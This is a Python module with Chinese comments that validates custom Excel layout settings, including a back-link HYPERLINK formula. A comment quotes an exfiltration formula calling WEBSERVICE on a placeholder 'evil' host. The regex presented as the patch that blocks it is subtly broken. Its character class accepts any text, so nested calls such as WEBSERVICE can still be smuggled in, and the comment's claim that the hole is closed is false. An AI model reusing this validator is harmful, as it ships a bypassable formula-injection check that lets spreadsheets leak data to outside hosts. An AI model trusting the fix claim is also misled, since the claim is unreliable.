"""自定义排版层（ADR-0022）：读 ``df.attrs["_layout"]``。

默认场景的排版决策由固定模板承担（Content/Cover/单双层表头）；AI 需要
横/纵/多层表头、自定义锚点、关闭返回链接时，通过 ``_layout`` 接管业务
Sheet 的排版，样式原子（颜色/字体/边框）仍然复用——样式是标准，排版
是自由度。

支持的键（全部可选）：

- ``header_rows``: int ≥ 1，表头带行数
- ``header_columns``: list[list[str]]，逐行表头标签（行 × 列）；同值相邻
  单元格横向自动合并
- ``anchor_cell``: [row, col]（1 基），数据起始锚点，默认表头带下一行
- ``freeze_panes``: str，如 "A4"；默认锚点行
- ``back_link``: {"cell": "A1", "formula": "=HYPERLINK(...)"} 或 None
  （显式 None = 不写返回链接）
- ``column_widths``: list[float]

格式非法一律 ValueError（fail-closed，publish 回执会带原因）。
"""
from dataclasses import dataclass, field
from typing import List, Optional, Tuple
import re

import pandas as pd

LAYOUT_ATTR = "_layout"

#: back_link 唯一放行形态：两个参数都必须是字面量字符串——第一参数是
#: "#..." 内部定位（如 "#'Content'!A1"），第二参数是显示文本；字符串内
#: 允许 Excel 的双引号转义形态（""，与 templates.hyperlink_formula 一致）。
#: 前缀级 ``=HYPERLINK(`` 白名单会被 ``=HYPERLINK(WEBSERVICE("http://evil/"&A1),..)``
#: 穿透（Excel 打开即外传单元格值），因此升级为全式匹配（V-8 收口补丁）。
_BACK_LINK_FORMULA_PATTERN = re.compile(
    r'^=HYPERLINK\(\s*"(?:[^"]|")*"\s*,\s*"(?:[^"]|")*"\s*\)$', re.IGNORECASE)


@dataclass(frozen=True)
class Layout:
    """解析并校验后的自定义排版。"""

    header_rows: int
    header_columns: Optional[List[List[str]]]
    anchor_cell: Tuple[int, int]
    freeze_panes: Optional[str]
    back_link: Optional[dict]
    column_widths: Optional[List[float]]
    raw: dict = field(default_factory=dict, repr=False)


def read_layout(frame: pd.DataFrame) -> Optional[Layout]:
    """读 attrs["_layout"]；没有则 None（走默认渲染）。非法配置抛 ValueError。"""
    spec = frame.attrs.get(LAYOUT_ATTR)
    if spec is None:
        return None
    if not isinstance(spec, dict):
        raise ValueError('DataFrame.attrs["_layout"] 必须是字典')
    return parse_layout(spec)


#: 未显式给出 back_link 时默认与模板行为一致：A1 返回链接；
#: 显式 ``back_link: null`` 表示不写返回链接。
_DEFAULT_BACK_LINK = {"cell": "A1", "formula": '=HYPERLINK("#\'Content\'!A1","Go back")'}


def parse_layout(spec: dict) -> Layout:
    # header_columns 先做自身校验（空列表/非字符串报 header_columns 的错误），
    # 再派生 header_rows，最后做两者交叉校验
    raw_header_columns = spec.get("header_columns")
    header_columns = _parse_header_columns(raw_header_columns) if raw_header_columns is not None else None

    header_rows = spec.get("header_rows")
    if header_rows is None:
        header_rows = len(header_columns) if header_columns is not None else 1
    if not isinstance(header_rows, int) or isinstance(header_rows, bool) or header_rows < 1:
        raise ValueError(f'_layout["header_rows"] 必须是 ≥1 的整数: {header_rows!r}')
    if header_columns is not None and len(header_columns) < header_rows:
        raise ValueError(
            f'_layout["header_columns"] 行数 {len(header_columns)} 少于 header_rows={header_rows}'
        )

    anchor = spec.get("anchor_cell")
    if anchor is None:
        anchor_cell = (header_rows + 1, 1)
    else:
        anchor_cell = _parse_anchor(anchor)
        if anchor_cell[0] <= header_rows:
            raise ValueError(
                f'_layout["anchor_cell"] 行 {anchor_cell[0]} 必须位于表头带（{header_rows} 行）之下'
            )

    freeze = spec.get("freeze_panes")
    if freeze is not None and (not isinstance(freeze, str) or not freeze.strip()):
        raise ValueError(f'_layout["freeze_panes"] 必须是非空字符串: {freeze!r}')

    back_link = spec.get("back_link", _DEFAULT_BACK_LINK)
    if back_link is not None:
        back_link = _parse_back_link(back_link)

    widths = spec.get("column_widths")
    if widths is not None:
        if not isinstance(widths, list) or not all(
            isinstance(value, (int, float)) and not isinstance(value, bool) and value > 0
            for value in widths
        ):
            raise ValueError('_layout["column_widths"] 必须是正数列表')

    return Layout(
        header_rows=header_rows,
        header_columns=header_columns,
        anchor_cell=anchor_cell,
        freeze_panes=freeze,
        back_link=back_link,
        column_widths=widths,
        raw=dict(spec),
    )


def _parse_header_columns(value) -> List[List[str]]:
    if not isinstance(value, list) or not value:
        raise ValueError('_layout["header_columns"] 必须是非空 list[list[str]]')
    rows: List[List[str]] = []
    for index, row in enumerate(value):
        if not isinstance(row, list) or not all(isinstance(cell, str) for cell in row):
            raise ValueError(f'_layout["header_columns"][{index}] 必须是字符串列表')
        rows.append(list(row))
    return rows


def _parse_anchor(value) -> Tuple[int, int]:
    if (
        not isinstance(value, (list, tuple))
        or len(value) != 2
        or not all(isinstance(item, int) and not isinstance(item, bool) and item >= 1 for item in value)
    ):
        raise ValueError(f'_layout["anchor_cell"] 必须是 1 基 [row, col]: {value!r}')
    return (int(value[0]), int(value[1]))


def _parse_back_link(value) -> dict:
    if not isinstance(value, dict):
        raise ValueError(f'_layout["back_link"] 必须是 {{cell, formula}} 或 null: {value!r}')
    cell = value.get("cell")
    formula = value.get("formula")
    if not isinstance(cell, str) or not cell.strip():
        raise ValueError(f'_layout["back_link"]["cell"] 必须是非空单元格地址: {cell!r}')
    if not isinstance(formula, str) or not formula.strip():
        raise ValueError(f'_layout["back_link"]["formula"] 必须是非空公式: {formula!r}')
    # 安全口径（漏洞扫描 V-8 + 2026-09-03 补丁）：仅接受两参数均为字面量
    # 字符串的 =HYPERLINK("#内部定位","显示文本") 形态；嵌套函数调用
    # （WEBSERVICE/CONCAT 拼接引用）一律拒绝。
    if not _BACK_LINK_FORMULA_PATTERN.match(formula.strip()):
        raise ValueError(
            '_layout["back_link"]["formula"] 仅支持 =HYPERLINK("#\'Sheet\'!A1","文本") '
            '字面量形态（两参数都必须是不含公式的字符串）')
    return {"cell": cell, "formula": formula}
